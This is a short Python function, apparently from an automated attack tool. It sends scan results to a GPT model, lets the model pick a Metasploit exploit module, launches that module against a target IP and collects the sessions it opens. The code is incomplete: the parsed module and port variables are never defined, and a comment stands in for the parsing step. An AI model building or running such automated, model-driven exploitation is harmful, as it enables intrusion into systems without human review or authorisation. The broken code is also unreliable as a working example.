from pymetasploit3.msfrpc import MsfRpcClient
from utils.gpt_client import ask_gpt
import os

def do_exploit(target_ip, scan_data, logger):
    client = MsfRpcClient(os.getenv("MSF_RPC_PASSWORD"))
    prompt = f"Based on scan {scan_data['analysis']}, suggest exploit module and parameters."
    gpt_out = ask_gpt(prompt)
    # parse "use exploit X" via regex
    exploit = client.modules.use('exploit', parsed_module)
    exploit['RHOSTS'] = target_ip
    exploit['RPORT']  = parsed_port
    job_id = exploit.execute()
    sessions = client.sessions.list
    logger.info(f"Exploit launched: {gpt_out}, sessions: {sessions}")
    return {"gpt": gpt_out, "sessions": sessions}